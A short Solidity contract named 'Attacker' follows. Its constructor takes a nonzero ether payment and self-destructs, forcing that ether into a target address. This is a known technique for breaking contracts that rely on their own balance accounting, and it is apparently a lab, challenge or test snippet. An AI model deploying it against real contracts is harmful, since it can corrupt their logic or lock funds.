// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Attacker {
    constructor(address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
